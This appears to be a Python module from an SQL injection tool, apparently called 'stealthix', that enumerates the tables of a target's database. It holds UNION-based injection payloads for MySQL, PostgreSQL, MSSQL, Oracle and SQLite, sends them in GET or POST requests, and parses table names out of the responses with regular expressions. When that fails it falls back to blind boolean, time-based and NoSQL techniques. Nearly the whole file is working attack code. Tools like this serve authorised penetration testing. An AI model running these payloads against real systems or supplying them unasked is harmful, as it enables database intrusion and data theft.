from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _extract_values,
    _finalize_collection_result,
    _get_extraction_profile,
    _make_request,
    _merge_results,
    _plugin_family,
    _preferred_extraction_techniques,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)
from stealthix.extraction.blind import enumerate_tables_blind
from stealthix.extraction.nosql_extract import enumerate_tables_nosql


def _payloads(dbms: str | None, database: str | None) -> list[str]:
    if dbms in {"mysql", "mariadb", "tidb"} and database:
        return [
            f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'--"
        ]
    if dbms in {"postgresql", "cockroachdb"}:
        return ["' UNION SELECT tablename FROM pg_tables--"]
    if dbms == "mssql":
        return ["' UNION SELECT name FROM sysobjects WHERE xtype='U'--"]
    if dbms == "oracle":
        return ["' UNION SELECT table_name FROM all_tables--"]
    if dbms == "sqlite":
        return ["' UNION SELECT name FROM sqlite_master WHERE type='table'--"]
    return [
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT tablename FROM pg_tables--",
        "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        "' UNION SELECT table_name FROM all_tables--",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    ]


def enumerate_tables(session: ScanSession, database: str | None = None) -> dict[str, Any]:
    if _plugin_family(session) == "nosql":
        return enumerate_tables_nosql(session, database=database)
    dbms = (session.config.dbms or "").lower()
    default_payloads = _payloads(dbms, database)
    profile = _get_extraction_profile(session, "tables") or {}
    payloads = (
        profile.get("payloads") if isinstance(profile.get("payloads"), list) else default_payloads
    )
    techniques = _preferred_extraction_techniques(session)
    results = _result_base(session, "tables", payloads if "union" in techniques else [])
    results["database"] = database
    results["tables"] = []
    default_patterns = [
        r"\btable[:=\s]+([a-z0-9_]+)",
        r"\btablename[:=\s]+([a-z0-9_]+)",
        r"\btable_name[:=\s]+([a-z0-9_]+)",
    ]
    patterns = (
        profile.get("patterns") if isinstance(profile.get("patterns"), list) else default_patterns
    )
    if "union" in techniques:
        for payload in payloads if isinstance(payloads, list) else []:
            prepared = _prepare_payload(session, payload)
            if method_uses_body(session.config.method):
                target, data = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target, data, "POST")
            else:
                target, _ = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target)
            results["responses"].append(_response_entry(target, prepared, body, elapsed))
            extracted = _extract_values(body, patterns)
            if extracted:
                _record_success(results, prepared)
                results["tables"].extend(extracted)
        results = _finalize_collection_result(results, "tables")
        if results["success"]:
            results["technique"] = "union"
            return results

    merged = results
    for technique in techniques:
        if technique not in {"boolean", "time"}:
            continue
        blind_result = enumerate_tables_blind(session, technique=technique, database=database)
        merged = _merge_results(results, blind_result)
        if blind_result.get("success"):
            return merged
    return merged
